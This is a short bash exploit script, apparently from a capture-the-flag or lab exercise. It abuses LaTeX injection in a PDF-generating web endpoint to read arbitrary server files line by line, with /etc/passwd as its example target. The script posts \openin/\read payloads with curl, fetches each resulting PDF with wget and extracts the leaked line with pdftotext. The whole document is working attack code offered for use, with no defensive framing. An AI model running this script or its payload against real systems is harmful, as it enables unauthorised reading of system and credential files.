#!/bin/bash

# global variables
declare -r main_url="http://localhost/ajax.php"
filename=$1
n_lines=$2

# if the filename and the number of lines are being sent
if [ $filename ] && [ $n_lines ]; then
	jump_line_string="%0A\read\file%20to\line"
	for i in $(seq 1 $n_lines); do
		# get url generated of the latex code
		url_file_generated=$(curl -s -X POST $main_url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename$jump_line_string%0A\text{\line}%0A\closein\file&template=blank" | grep -i "download" | awk 'NF{print $NF}')

		if [ $url_file_generated ]; then
			# get the PDF generated and its name
			wget $url_file_generated &>/dev/null
			pdf_name=$(echo $url_file_generated | tr '/' ' ' | awk 'NF{print $NF}')

			# convert PDF generated to TXT
			pdftotext $pdf_name

			# print the desired content
			txt_name=$(echo $pdf_name | sed 's/\.pdf/\.txt/')
			cat $txt_name | head -n 1

			# clean the environment
			rm -f $pdf_name
			rm -f $txt_name
		fi 

		# jump to the next line
		jump_line_string+="%0A\read\file%20to\line"
	done
else
	echo -e "\n[!] Use: $0 /etc/passwd 60\n"
fi

